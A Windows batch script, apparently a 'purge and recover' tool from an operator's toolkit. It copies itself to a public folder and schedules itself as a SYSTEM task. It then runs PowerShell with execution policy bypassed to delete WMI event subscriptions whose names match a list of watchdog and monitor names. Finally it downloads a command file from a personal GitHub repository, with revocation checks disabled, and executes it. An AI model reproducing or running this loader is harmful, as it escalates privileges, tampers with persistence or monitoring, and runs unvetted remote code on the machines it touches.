@echo off
rem WINRTCS YOGA one-shot: purge C12 WMI then R3 Gryxa recover (schtasks-safe).
rem Usage: call with --detached from schtasks SYSTEM.
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\yoga_pr.cmd" >nul 2>&1
  schtasks /Delete /TN WinRTCSYogaPR /F >nul 2>&1
  schtasks /Create /TN WinRTCSYogaPR /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\yoga_pr.cmd --detached"
  schtasks /Run /TN WinRTCSYogaPR
  echo QUEUED yoga-purge-recover - log C:\Users\Public\yoga_pr.log
  exit /b 0
)
setlocal EnableExtensions
set "LOG=C:\Users\Public\yoga_pr.log"
>"%LOG%" echo [%DATE% %TIME%] begin host=%COMPUTERNAME%

echo [%DATE% %TIME%] purge_wmi>>"%LOG%"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'; $ns='root\subscription'; $log='C:\Users\Public\yoga_pr.log'; $pat='SCWatchdog|SystemHealthMonitor|BVTConsumer|BVTTrigger|BVTFilter|WucacheWatchdog|KernCap|SCCleanup|KeepTwo|ETLParser|NetTraceParser|wucache'; function L($m){ Add-Content $log ((Get-Date -Format o)+' '+$m) }; for($r=1;$r -le 6;$r++){ $n=0; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | ForEach-Object { $b=[string]$_.Filter+' '+[string]$_.Consumer; if($b -match $pat){ try{ $_.Delete(); L ('del_bind '+$b); $n++ }catch{} } }; Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer | ForEach-Object { if(($_.Name -match $pat) -or ($_.CommandLineTemplate -and $_.CommandLineTemplate -match $pat)){ $nm=$_.Name; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($nm) } | ForEach-Object { try{ $_.Delete() }catch{} }; try{ $_.Delete(); L ('del_cons '+$nm); $n++ }catch{} } }; Get-WmiObject -Namespace $ns -Class __EventFilter | ForEach-Object { if(($_.Name -match $pat) -or ($_.Query -and $_.Query -match $pat)){ $nm=$_.Name; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($nm) } | ForEach-Object { try{ $_.Delete() }catch{} }; try{ $_.Delete(); L ('del_filt '+$nm); $n++ }catch{} } }; L ('round='+$r+' killed='+$n); if($n -eq 0){ break } }; L 'purge_done'"

echo [%DATE% %TIME%] fetch_recover>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o C:\Users\Public\gryxa_recover.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd >>"%LOG%" 2>&1
if not exist C:\Users\Public\gryxa_recover.cmd (
  echo [%DATE% %TIME%] FAIL_no_recover>>"%LOG%"
  exit /b 3
)
echo [%DATE% %TIME%] run_recover_r3>>"%LOG%"
call C:\Users\Public\gryxa_recover.cmd --detached
echo [%DATE% %TIME%] recover_called>>"%LOG%"
endlocal & exit /b 0
